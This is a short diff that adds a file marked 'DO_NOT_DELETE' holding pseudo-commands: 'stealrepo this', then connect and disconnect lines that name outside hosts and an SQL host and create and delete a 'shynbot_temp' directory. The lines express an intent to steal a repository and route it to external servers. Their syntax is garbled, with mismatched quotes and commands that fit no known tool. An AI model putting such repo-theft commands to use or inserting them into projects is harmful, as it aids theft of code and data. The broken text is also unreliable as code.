@@ -1,0 +1,4 @@
++GMR_FILE-DO_NOT_DELETE!
+-stealrepo this
+-connect "repolab.elementfx.net84.net" --sqlhost "sql3.000webhost.com:8838" --repolive "elementfx.net84.net' ++{Create_directory(JSON{"name": "shynbot_temp"})}
+-disconnect "repolab.elementfx.net84.net" --sqlhost "sql3.000webhost.com:8838" --repolive "elementfx.net84.net' ++{Delete_directory(JSON{"name": "shynbot_temp})}
